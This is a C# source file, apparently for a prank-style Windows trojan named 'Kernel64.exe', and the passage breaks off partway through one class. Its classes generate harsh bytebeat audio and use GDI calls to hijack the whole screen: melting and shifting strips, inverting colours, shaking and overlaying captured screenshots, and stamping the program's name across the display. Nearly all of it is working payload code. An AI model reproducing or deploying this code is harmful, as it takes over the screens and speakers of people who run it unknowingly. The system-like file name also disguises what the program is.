using Kernel64;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Threading;
using System.Windows.Forms;
using static Drawer1;
using static RandomDrawer;

namespace Kernel64
{
    public abstract class Drawer
    {
        public abstract void Draw(IntPtr hdc);
    }

    public class bb1 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
                binaryWriter.Write("RIFF".ToCharArray());
                binaryWriter.Write(0u);
                binaryWriter.Write("WAVE".ToCharArray());
                binaryWriter.Write("fmt ".ToCharArray());
                binaryWriter.Write(16u);
                binaryWriter.Write((ushort)1);
                int num = 1;
                int num2 = 11205;
                int num3 = 8;
                binaryWriter.Write((ushort)num);
                binaryWriter.Write((uint)num2);
                binaryWriter.Write((uint)(num2 * num * num3 / 8));
                binaryWriter.Write((ushort)(num * num3 / 8));
                binaryWriter.Write((ushort)num3);
                binaryWriter.Write("data".ToCharArray());
                int num4 = 30;
                byte[] array = new byte[num2 * num4];
                for (int t = 0; t < array.Length; t++)
                {
                    array[t] = (byte)(t * (((t >> 6 | t >> 12) & 15 & t >> 10)));
                }
                binaryWriter.Write((uint)(array.Length * num * num3 / 8));
                byte[] array2 = array;
                foreach (byte value in array2)
                {
                    binaryWriter.Write(value);
                }
                binaryWriter.Seek(4, SeekOrigin.Begin);
                binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
                memoryStream.Seek(0L, SeekOrigin.Begin);
                new SoundPlayer(memoryStream).PlaySync();
            }
        }
    }

    public class bb2 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
                binaryWriter.Write("RIFF".ToCharArray());
                binaryWriter.Write(0u);
                binaryWriter.Write("WAVE".ToCharArray());
                binaryWriter.Write("fmt ".ToCharArray());
                binaryWriter.Write(16u);
                binaryWriter.Write((ushort)1);
                int num = 1;
                int num2 = 11025;
                int num3 = 8;
                binaryWriter.Write((ushort)num);
                binaryWriter.Write((uint)num2);
                binaryWriter.Write((uint)(num2 * num * num3 / 8));
                binaryWriter.Write((ushort)(num * num3 / 8));
                binaryWriter.Write((ushort)num3);
                binaryWriter.Write("data".ToCharArray());
                int num4 = 30;
                byte[] array = new byte[num2 * num4];
                for (int t = 0; t < array.Length; t++)
                {
                    array[t] = (byte)((t % 257) * (t % 255));
                }
                binaryWriter.Write((uint)(array.Length * num * num3 / 8));
                byte[] array2 = array;
                foreach (byte value in array2)
                {
                    binaryWriter.Write(value);
                }
                binaryWriter.Seek(4, SeekOrigin.Begin);
                binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
                memoryStream.Seek(0L, SeekOrigin.Begin);
                new SoundPlayer(memoryStream).PlaySync();
            }
        }
    }

    public class bb3 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
                binaryWriter.Write("RIFF".ToCharArray());
                binaryWriter.Write(0u);
                binaryWriter.Write("WAVE".ToCharArray());
                binaryWriter.Write("fmt ".ToCharArray());
                binaryWriter.Write(16u);
                binaryWriter.Write((ushort)1);
                int num = 1;
                int num2 = 11025;
                int num3 = 8;
                binaryWriter.Write((ushort)num);
                binaryWriter.Write((uint)num2);
                binaryWriter.Write((uint)(num2 * num * num3 / 8));
                binaryWriter.Write((ushort)(num * num3 / 8));
                binaryWriter.Write((ushort)num3);
                binaryWriter.Write("data".ToCharArray());
                int num4 = 30;
                byte[] array = new byte[num2 * num4];
                for (int t = 0; t < array.Length; t++)
                {
                    int mod4095 = t & 4095;
                    double sinPart = mod4095 == 0 ? 0.0 : 70.0 * Math.Sin(4000.0 / mod4095);
                    int val = ((t * (int)"57"[(t >> 14) % 2]) >> 2 & 128) + (t * (int)"1234"[(t >> 10) % 4] * (int)"57"[(t >> 14) % 2] & 95) + 96 * (1 - (1 & t >> (int)"999"[(t >> 12) % 2])) + (int)sinPart;
                    array[t] = (byte)val;
                }
                binaryWriter.Write((uint)(array.Length * num * num3 / 8));
                byte[] array2 = array;
                foreach (byte value in array2)
                {
                    binaryWriter.Write(value);
                }
                binaryWriter.Seek(4, SeekOrigin.Begin);
                binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
                memoryStream.Seek(0L, SeekOrigin.Begin);
                new SoundPlayer(memoryStream).PlaySync();
            }
        }
    }

    public class bb4 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
                binaryWriter.Write("RIFF".ToCharArray());
                binaryWriter.Write(0u);
                binaryWriter.Write("WAVE".ToCharArray());
                binaryWriter.Write("fmt ".ToCharArray());
                binaryWriter.Write(16u);
                binaryWriter.Write((ushort)1);
                int num = 1;
                int num2 = 11025;
                int num3 = 8;
                binaryWriter.Write((ushort)num);
                binaryWriter.Write((uint)num2);
                binaryWriter.Write((uint)(num2 * num * num3 / 8));
                binaryWriter.Write((ushort)(num * num3 / 8));
                binaryWriter.Write((ushort)num3);
                binaryWriter.Write("data".ToCharArray());
                int num4 = 30;
                byte[] array = new byte[num2 * num4];
                for (int t = 0; t < array.Length; t++)
                {
                    array[t] = (byte)((t >> t) + t);
                }
                binaryWriter.Write((uint)(array.Length * num * num3 / 8));
                byte[] array2 = array;
                foreach (byte value in array2)
                {
                    binaryWriter.Write(value);
                }
                binaryWriter.Seek(4, SeekOrigin.Begin);
                binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
                memoryStream.Seek(0L, SeekOrigin.Begin);
                new SoundPlayer(memoryStream).PlaySync();
            }
        }
    }

    public class bb5 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
                binaryWriter.Write("RIFF".ToCharArray());
                binaryWriter.Write(0u);
                binaryWriter.Write("WAVE".ToCharArray());
                binaryWriter.Write("fmt ".ToCharArray());
                binaryWriter.Write(16u);
                binaryWriter.Write((ushort)1);
                int num = 1;
                int num2 = 8000;
                int num3 = 8;
                binaryWriter.Write((ushort)num);
                binaryWriter.Write((uint)num2);
                binaryWriter.Write((uint)(num2 * num * num3 / 8));
                binaryWriter.Write((ushort)(num * num3 / 8));
                binaryWriter.Write((ushort)num3);
                binaryWriter.Write("data".ToCharArray());
                int num4 = 30;
                byte[] array = new byte[num2 * num4];
                for (int t = 0; t < array.Length; t++)
                {
                    array[t] = (byte)(t >> t * t & t >> 8);
                }
                binaryWriter.Write((uint)(array.Length * num * num3 / 8));
                byte[] array2 = array;
                foreach (byte value in array2)
                {
                    binaryWriter.Write(value);
                }
                binaryWriter.Seek(4, SeekOrigin.Begin);
                binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
                memoryStream.Seek(0L, SeekOrigin.Begin);
                new SoundPlayer(memoryStream).PlaySync();
            }
        }
    }
    public class bb6 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
                binaryWriter.Write("RIFF".ToCharArray());
                binaryWriter.Write(0u);
                binaryWriter.Write("WAVE".ToCharArray());
                binaryWriter.Write("fmt ".ToCharArray());
                binaryWriter.Write(16u);
                binaryWriter.Write((ushort)1);
                int num = 1;
                int num2 = 22050;
                int num3 = 8;
                binaryWriter.Write((ushort)num);
                binaryWriter.Write((uint)num2);
                binaryWriter.Write((uint)(num2 * num * num3 / 8));
                binaryWriter.Write((ushort)(num * num3 / 8));
                binaryWriter.Write((ushort)num3);
                binaryWriter.Write("data".ToCharArray());
                int num4 = 30;
                byte[] array = new byte[num2 * num4];
                for (int t = 0; t < array.Length; t++)
                {
                    array[t] = (byte)((t & t >> 6) + (t | t >> 8) + (t | t >> 7) + (t | t >> 9) * t);
                }
                binaryWriter.Write((uint)(array.Length * num * num3 / 8));
                byte[] array2 = array;
                foreach (byte value in array2)
                {
                    binaryWriter.Write(value);
                }
                binaryWriter.Seek(4, SeekOrigin.Begin);
                binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
                memoryStream.Seek(0L, SeekOrigin.Begin);
                new SoundPlayer(memoryStream).PlaySync();
            }
        }
    }
    public class bb7 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
                binaryWriter.Write("RIFF".ToCharArray());
                binaryWriter.Write(0u);
                binaryWriter.Write("WAVE".ToCharArray());
                binaryWriter.Write("fmt ".ToCharArray());
                binaryWriter.Write(16u);
                binaryWriter.Write((ushort)1);
                int num = 1;
                int num2 = 44100;
                int num3 = 8;
                binaryWriter.Write((ushort)num);
                binaryWriter.Write((uint)num2);
                binaryWriter.Write((uint)(num2 * num * num3 / 8));
                binaryWriter.Write((ushort)(num * num3 / 8));
                binaryWriter.Write((ushort)num3);
                binaryWriter.Write("data".ToCharArray());
                int num4 = 30;
                byte[] array = new byte[num2 * num4];
                for (int t = 0; t < array.Length; t++)
                {
                    array[t] = (byte)(t & t ^ 8 * t >> 0x0D + t);
                }
                binaryWriter.Write((uint)(array.Length * num * num3 / 8));
                byte[] array2 = array;
                foreach (byte value in array2)
                {
                    binaryWriter.Write(value);
                }
                binaryWriter.Seek(4, SeekOrigin.Begin);
                binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
                memoryStream.Seek(0L, SeekOrigin.Begin);
                new SoundPlayer(memoryStream).PlaySync();
            }
        }
    }
    public class bb8 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
                binaryWriter.Write("RIFF".ToCharArray());
                binaryWriter.Write(0u);
                binaryWriter.Write("WAVE".ToCharArray());
                binaryWriter.Write("fmt ".ToCharArray());
                binaryWriter.Write(16u);
                binaryWriter.Write((ushort)1);
                int num = 1;
                int num2 = 8000;
                int num3 = 8;
                binaryWriter.Write((ushort)num);
                binaryWriter.Write((uint)num2);
                binaryWriter.Write((uint)(num2 * num * num3 / 8));
                binaryWriter.Write((ushort)(num * num3 / 8));
                binaryWriter.Write((ushort)num3);
                binaryWriter.Write("data".ToCharArray());
                int num4 = 30;
                byte[] array = new byte[num2 * num4];
                for (int t = 0; t < array.Length; t++)
                {
                    array[t] = (byte)(t + t >> t);
                }
                binaryWriter.Write((uint)(array.Length * num * num3 / 8));
                byte[] array2 = array;
                foreach (byte value in array2)
                {
                    binaryWriter.Write(value);
                }
                binaryWriter.Seek(4, SeekOrigin.Begin);
                binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
                memoryStream.Seek(0L, SeekOrigin.Begin);
                new SoundPlayer(memoryStream).PlaySync();
            }
        }
    }
    public class bb9 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
                binaryWriter.Write("RIFF".ToCharArray());
                binaryWriter.Write(0u);
                binaryWriter.Write("WAVE".ToCharArray());
                binaryWriter.Write("fmt ".ToCharArray());
                binaryWriter.Write(16u);
                binaryWriter.Write((ushort)1);
                int num = 1;
                int num2 = 11025;
                int num3 = 8;
                binaryWriter.Write((ushort)num);
                binaryWriter.Write((uint)num2);
                binaryWriter.Write((uint)(num2 * num * num3 / 8));
                binaryWriter.Write((ushort)(num * num3 / 8));
                binaryWriter.Write((ushort)num3);
                binaryWriter.Write("data".ToCharArray());
                int num4 = 30;
                byte[] array = new byte[num2 * num4];
                for (int t = 0; t < array.Length; t++)
                {
                    array[t] = (byte)(t * (t ^ t >> 10 & t & t >> 8) + t);
                }
                binaryWriter.Write((uint)(array.Length * num * num3 / 8));
                byte[] array2 = array;
                foreach (byte value in array2)
                {
                    binaryWriter.Write(value);
                }
                binaryWriter.Seek(4, SeekOrigin.Begin);
                binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
                memoryStream.Seek(0L, SeekOrigin.Begin);
                new SoundPlayer(memoryStream).PlaySync();
            }
        }
    }
    public class bb10 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
                binaryWriter.Write("RIFF".ToCharArray());
                binaryWriter.Write(0u);
                binaryWriter.Write("WAVE".ToCharArray());
                binaryWriter.Write("fmt ".ToCharArray());
                binaryWriter.Write(16u);
                binaryWriter.Write((ushort)1);
                int num = 1;
                int num2 = 11025;
                int num3 = 8;
                binaryWriter.Write((ushort)num);
                binaryWriter.Write((uint)num2);
                binaryWriter.Write((uint)(num2 * num * num3 / 8));
                binaryWriter.Write((ushort)(num * num3 / 8));
                binaryWriter.Write((ushort)num3);
                binaryWriter.Write("data".ToCharArray());
                int num4 = 30;
                byte[] array = new byte[num2 * num4];
                for (int t = 0; t < array.Length; t++)
                {
                    array[t] = (byte)(t * (t ^ t >> 10) + t);
                }
                binaryWriter.Write((uint)(array.Length * num * num3 / 8));
                byte[] array2 = array;
                foreach (byte value in array2)
                {
                    binaryWriter.Write(value);
                }
                binaryWriter.Seek(4, SeekOrigin.Begin);
                binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
                memoryStream.Seek(0L, SeekOrigin.Begin);
                new SoundPlayer(memoryStream).PlaySync();
            }
        }
    }
    public class bb11 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
                binaryWriter.Write("RIFF".ToCharArray());
                binaryWriter.Write(0u);
                binaryWriter.Write("WAVE".ToCharArray());
                binaryWriter.Write("fmt ".ToCharArray());
                binaryWriter.Write(16u);
                binaryWriter.Write((ushort)1);
                int num = 1;
                int num2 = 22050;
                int num3 = 8;
                binaryWriter.Write((ushort)num);
                binaryWriter.Write((uint)num2);
                binaryWriter.Write((uint)(num2 * num * num3 / 8));
                binaryWriter.Write((ushort)(num * num3 / 8));
                binaryWriter.Write((ushort)num3);
                binaryWriter.Write("data".ToCharArray());
                int num4 = 30;
                byte[] array = new byte[num2 * num4];
                for (int t = 0; t < array.Length; t++)
                {
                    array[t] = (byte)((3 * t & t >> 10) - 1);
                }
                binaryWriter.Write((uint)(array.Length * num * num3 / 8));
                byte[] array2 = array;
                foreach (byte value in array2)
                {
                    binaryWriter.Write(value);
                }
                binaryWriter.Seek(4, SeekOrigin.Begin);
                binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
                memoryStream.Seek(0L, SeekOrigin.Begin);
                new SoundPlayer(memoryStream).PlaySync();
            }
        }
    }
    public class bb12 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
                binaryWriter.Write("RIFF".ToCharArray());
                binaryWriter.Write(0u);
                binaryWriter.Write("WAVE".ToCharArray());
                binaryWriter.Write("fmt ".ToCharArray());
                binaryWriter.Write(16u);
                binaryWriter.Write((ushort)1);
                int num = 1;
                int num2 = 22050;
                int num3 = 8;
                binaryWriter.Write((ushort)num);
                binaryWriter.Write((uint)num2);
                binaryWriter.Write((uint)(num2 * num * num3 / 8));
                binaryWriter.Write((ushort)(num * num3 / 8));
                binaryWriter.Write((ushort)num3);
                binaryWriter.Write("data".ToCharArray());
                int num4 = 30;
                byte[] array = new byte[num2 * num4];
                for (int t = 0; t < array.Length; t++)
                {
                    array[t] = (byte)(5 * (t ^ t >> 10));
                }
                binaryWriter.Write((uint)(array.Length * num * num3 / 8));
                byte[] array2 = array;
                foreach (byte value in array2)
                {
                    binaryWriter.Write(value);
                }
                binaryWriter.Seek(4, SeekOrigin.Begin);
                binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
                memoryStream.Seek(0L, SeekOrigin.Begin);
                new SoundPlayer(memoryStream).PlaySync();
            }
        }
    }
    public class bb13 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
                binaryWriter.Write("RIFF".ToCharArray());
                binaryWriter.Write(0u);
                binaryWriter.Write("WAVE".ToCharArray());
                binaryWriter.Write("fmt ".ToCharArray());
                binaryWriter.Write(16u);
                binaryWriter.Write((ushort)1);
                int num = 1;
                int num2 = 11025;
                int num3 = 8;
                binaryWriter.Write((ushort)num);
                binaryWriter.Write((uint)num2);
                binaryWriter.Write((uint)(num2 * num * num3 / 8));
                binaryWriter.Write((ushort)(num * num3 / 8));
                binaryWriter.Write((ushort)num3);
                binaryWriter.Write("data".ToCharArray());
                int num4 = 30;
                byte[] array = new byte[num2 * num4];
                for (int t = 0; t < array.Length; t++)
                {
                    array[t] = (byte)(t * (t ^ t >> 10) * t);
                }
                binaryWriter.Write((uint)(array.Length * num * num3 / 8));
                byte[] array2 = array;
                foreach (byte value in array2)
                {
                    binaryWriter.Write(value);
                }
                binaryWriter.Seek(4, SeekOrigin.Begin);
                binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
                memoryStream.Seek(0L, SeekOrigin.Begin);
                new SoundPlayer(memoryStream).PlaySync();
            }
        }
    }
    public class bb14 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
                binaryWriter.Write("RIFF".ToCharArray());
                binaryWriter.Write(0u);
                binaryWriter.Write("WAVE".ToCharArray());
                binaryWriter.Write("fmt ".ToCharArray());
                binaryWriter.Write(16u);
                binaryWriter.Write((ushort)1);
                int num = 1;
                int num2 = 11025;
                int num3 = 8;
                binaryWriter.Write((ushort)num);
                binaryWriter.Write((uint)num2);
                binaryWriter.Write((uint)(num2 * num * num3 / 8));
                binaryWriter.Write((ushort)(num * num3 / 8));
                binaryWriter.Write((ushort)num3);
                binaryWriter.Write("data".ToCharArray());
                int num4 = 30;
                byte[] array = new byte[num2 * num4];
                for (int t = 0; t < array.Length; t++)
                {
                    array[t] = (byte)(t * 8 * (t >> t * 0x0F & t >> 5 + t >> 9));
                }
                binaryWriter.Write((uint)(array.Length * num * num3 / 8));
                byte[] array2 = array;
                foreach (byte value in array2)
                {
                    binaryWriter.Write(value);
                }
                binaryWriter.Seek(4, SeekOrigin.Begin);
                binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
                memoryStream.Seek(0L, SeekOrigin.Begin);
                new SoundPlayer(memoryStream).PlaySync();
            }
        }
    }
    public class bb15 : Drawer
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
                binaryWriter.Write("RIFF".ToCharArray());
                binaryWriter.Write(0u);
                binaryWriter.Write("WAVE".ToCharArray());
                binaryWriter.Write("fmt ".ToCharArray());
                binaryWriter.Write(16u);
                binaryWriter.Write((ushort)1);
                int num = 1;
                int num2 = 11025;
                int num3 = 8;
                binaryWriter.Write((ushort)num);
                binaryWriter.Write((uint)num2);
                binaryWriter.Write((uint)(num2 * num * num3 / 8));
                binaryWriter.Write((ushort)(num * num3 / 8));
                binaryWriter.Write((ushort)num3);
                binaryWriter.Write("data".ToCharArray());
                int num4 = 30;
                byte[] array = new byte[num2 * num4];
                for (int t = 0; t < array.Length; t++)
                {
                    array[t] = (byte)(t * (t ^ t >> 10) + t * t & t >> 8);
                }
                binaryWriter.Write((uint)(array.Length * num * num3 / 8));
                byte[] array2 = array;
                foreach (byte value in array2)
                {
                    binaryWriter.Write(value);
                }
                binaryWriter.Seek(4, SeekOrigin.Begin);
                binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
                memoryStream.Seek(0L, SeekOrigin.Begin);
                new SoundPlayer(memoryStream).PlaySync();
            }
        }
    }
}
public abstract class Drawer
{
    [DllImport("gdi32.dll")]
    protected static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, uint rop);

    [DllImport("msimg32.dll")]
    protected static extern bool AlphaBlend(IntPtr hdcDest, int xoriginDest, int yoriginDest, int wDest, int hDest, IntPtr hdcSrc, int xoriginSrc, int yoriginSrc, int wSrc, int hSrc, BLENDFUNCTION ftn);

    [StructLayout(LayoutKind.Sequential)]
    protected struct BLENDFUNCTION
    {
        public byte BlendOp;
        public byte BlendFlags;
        public byte SourceConstantAlpha;
        public byte AlphaFormat;
    }

    protected const uint SRCCOPY = 0x00CC0020;

    protected int ScreenW
    {
        get { return Screen.PrimaryScreen.Bounds.Width; }
    }

    protected int ScreenH
    {
        get { return Screen.PrimaryScreen.Bounds.Height; }
    }

    public abstract void Draw(IntPtr hdc);
}
public class Drawer1 : Drawer
{
    private int redrawCounter;
    private Random rand = new Random();
    private static readonly Font drawFont = new Font("Segoe UI", 24f, FontStyle.Bold);

    public override void Draw(IntPtr hdc)
    {
        int w = ScreenW;
        int h = ScreenH;

        for (int i = 0; i < 8; i++)
        {
            int x = rand.Next(0, w);
            int stripW = rand.Next(15, 60);
            int fallY = rand.Next(2, 12);
            BitBlt(hdc, x, fallY, stripW, h, hdc, x, 0, SRCCOPY);
        }

        BLENDFUNCTION bf = new BLENDFUNCTION();
        bf.BlendOp = 0;
        bf.BlendFlags = 0;
        bf.SourceConstantAlpha = 45;
        bf.AlphaFormat = 0;
        AlphaBlend(hdc, 0, 0, w, h, hdc, rand.Next(0, 5), rand.Next(0, 5), w, h, bf);

        redrawCounter++;
        if (redrawCounter % 3 == 0)
        {
            try
            {
                using (Graphics g = Graphics.FromHdc(hdc))
                using (SolidBrush brush = new SolidBrush(Color.FromArgb(rand.Next(256), rand.Next(256), rand.Next(256))))
                {
                    g.DrawString("Kernel64.exe", drawFont, brush, rand.Next(0, w), rand.Next(0, h));
                }
            }
            catch { }
        }
    }
}

public class Drawer2 : Drawer
    {
        [DllImport("gdi32.dll")]
        private static extern bool PatBlt(IntPtr hdc, int x, int y, int w, int h, uint rop);

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateSolidBrush(int color);

        [DllImport("gdi32.dll")]
        private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        private static extern bool DeleteObject(IntPtr ho);

        private const uint PATINVERT = 0x005A0049;

        private int redrawCounter;
        private Random rand = new Random();
        private int lastColorTick = Environment.TickCount;

        public override void Draw(IntPtr hdc)
        {
            int w = ScreenW;
            int h = ScreenH;
            int speed = 8;

            BitBlt(hdc, 0, 0, w, speed, hdc, 0, h - speed, SRCCOPY);
            BitBlt(hdc, 0, speed, w, h - speed, hdc, 0, 0, SRCCOPY);

            int now = Environment.TickCount;
            if (unchecked(now - lastColorTick) >= 1000)
            {
                lastColorTick = now;
                int color = rand.Next(0, 0x1000000);
                IntPtr brush = CreateSolidBrush(color);
                IntPtr oldBrush = SelectObject(hdc, brush);
                PatBlt(hdc, 0, 0, w, h, PATINVERT);
                SelectObject(hdc, oldBrush);
                DeleteObject(brush);
            }

            redrawCounter++;
        }
    }
public class Drawer3 : Drawer
{
    private int redrawCounter;
    private Random rand = new Random();

    public override void Draw(IntPtr hdc)
    {
        int w = ScreenW;
        int h = ScreenH;

        int dx = rand.Next(-20, 21);
        int dy = rand.Next(-20, 21);
        BitBlt(hdc, dx, dy, w, h, hdc, 0, 0, SRCCOPY);

        redrawCounter++;
    }
}
public class Drawer4 : Drawer
{
    private int redrawCounter;

    private Bitmap RotateImage(Bitmap bmp, float angle)
    {
        Bitmap rotated = new Bitmap(bmp.Width, bmp.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
        using (Graphics g = Graphics.FromImage(rotated))
        {
            g.TranslateTransform((float)bmp.Width / 2f, (float)bmp.Height / 2f);
            g.RotateTransform(angle);
            g.TranslateTransform(-(float)bmp.Width / 2f, -(float)bmp.Height / 2f);
            g.DrawImage(bmp, new Point(0, 0));
        }
        return rotated;
    }

    private Bitmap SetOpacity(Bitmap bmp, float opacity)
    {
        Bitmap target = new Bitmap(bmp.Width, bmp.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
        using (Graphics g = Graphics.FromImage(target))
        {
            System.Drawing.Imaging.ColorMatrix matrix = new System.Drawing.Imaging.ColorMatrix();
            matrix.Matrix33 = opacity;
            System.Drawing.Imaging.ImageAttributes attributes = new System.Drawing.Imaging.ImageAttributes();
            attributes.SetColorMatrix(matrix, System.Drawing.Imaging.ColorMatrixFlag.Default, System.Drawing.Imaging.ColorAdjustType.Bitmap);
            g.DrawImage(bmp, new Rectangle(0, 0, target.Width, target.Height), 0, 0, bmp.Width, bmp.Height, GraphicsUnit.Pixel, attributes);
        }
        return target;
    }

    public override void Draw(IntPtr hdc)
    {
        try
        {
            int width = Screen.PrimaryScreen.Bounds.Width;
            int height = Screen.PrimaryScreen.Bounds.Height;
            int x = Screen.PrimaryScreen.Bounds.X;
            int y = Screen.PrimaryScreen.Bounds.Y;
            Size size = Screen.PrimaryScreen.Bounds.Size;
            int zoom = 20;
            Rectangle destRect = new Rectangle(-zoom, -zoom, width + zoom * 2, height + zoom * 2);

            using (Graphics graphics = Graphics.FromHdc(hdc))
            using (Bitmap bitmap = new Bitmap(width, height, System.Drawing.Imaging.PixelFormat.Format32bppArgb))
            using (Graphics graphics2 = Graphics.FromImage(bitmap))
            {
                graphics2.CopyFromScreen(x, y, 0, 0, size, CopyPixelOperation.SourceCopy);
                using (Bitmap bmp = (Bitmap)bitmap.Clone())
                using (Bitmap image = RotateImage(bitmap, 1f))
                using (Bitmap image2 = RotateImage(bmp, -1f))
                using (Bitmap image3 = SetOpacity(image, 0.5f))
                using (Bitmap image4 = SetOpacity(image2, 0.5f))
                {
                    graphics.DrawImage(image3, destRect);
                    graphics.DrawImage(image4, destRect);
                }
            }
        }
        catch
        {
        }
        redrawCounter++;
        System.Threading.Thread.Sleep(0);
    }
}
public class Drawer5 : Drawer
{
    [DllImport("gdi32.dll")]
    private static extern bool PatBlt(IntPtr hdc, int x, int y, int w, int h, uint rop);

    private const uint DSTINVERT = 0x00550009;

    private int redrawCounter;
    private Random rand = new Random();
    private static readonly Image resImg = global::Kernel64.Properties.Resources.image_202211221317;

    public override void Draw(IntPtr hdc)
    {
        int w = ScreenW;
        int h = ScreenH;
        int speed = 8;

        BitBlt(hdc, 0, h - speed, w, speed, hdc, 0, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h - speed, hdc, 0, speed, SRCCOPY);

        if (resImg != null)
        {
            try
            {
                using (Graphics g = Graphics.FromHdc(hdc))
                {
                    int rw = rand.Next(20, w / 2);
                    int rh = rand.Next(20, h / 2);
                    int rx = rand.Next(0, w - rw);
                    int ry = rand.Next(0, h - rh);
                    g.DrawImage(resImg, rx, ry, rw, rh);
                }
            }
            catch { }
        }

        if (redrawCounter % 2 == 0)
        {
            PatBlt(hdc, 0, 0, w, h, DSTINVERT);
        }

        redrawCounter++;
    }
}
public class Drawer6 : Drawer
{
    private int redrawCounter;
    private Random rand = new Random();
    private static readonly Image staticImg = global::Kernel64.Properties.Resources.Static;
    private static Bitmap cachedImg;
    private static int lastW, lastH;

    public override void Draw(IntPtr hdc)
    {
        int w = ScreenW;
        int h = ScreenH;

        if (staticImg != null)
        {
            try
            {
                if (cachedImg == null || lastW != w || lastH != h)
                {
                    cachedImg?.Dispose();
                    cachedImg = new Bitmap(w, h, System.Drawing.Imaging.PixelFormat.Format32bppPArgb);
                    using (Graphics cg = Graphics.FromImage(cachedImg))
                    {
                        cg.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.NearestNeighbor;
                        cg.DrawImage(staticImg, 0, 0, w, h);
                    }
                    lastW = w;
                    lastH = h;
                }

                using (Graphics g = Graphics.FromHdc(hdc))
                {
                    g.CompositingMode = System.Drawing.Drawing2D.CompositingMode.SourceCopy;
                    int offsetX = rand.Next(-10, 11);
                    int offsetY = rand.Next(-10, 11);
                    g.DrawImageUnscaled(cachedImg, offsetX, offsetY);
                }
            }
            catch { }
        }

        redrawCounter++;
    }
}
public class Drawer7 : Drawer
{
    [DllImport("msimg32.dll")]
    private static extern bool AlphaBlend(IntPtr hdcDest, int xoriginDest, int yoriginDest, int wDest, int hDest, IntPtr hdcSrc, int xoriginSrc, int yoriginSrc, int wSrc, int hSrc, BLENDFUNCTION ftn);

    [StructLayout(LayoutKind.Sequential)]
    private struct BLENDFUNCTION
    {
        public byte BlendOp;
        public byte BlendFlags;
        public byte SourceConstantAlpha;
        public byte AlphaFormat;
    }

    private int redrawCounter;
    private Random rand = new Random();
    private int alphaValue = 5;
    private int lastTick = Environment.TickCount;
    private static readonly Image rgbImg = global::Kernel64.Properties.Resources.rgb;

    public override void Draw(IntPtr hdc)
    {
        int w = ScreenW;
        int h = ScreenH;

        for (int i = 0; i < 16; i++)
        {
            int x = rand.Next(0, w);
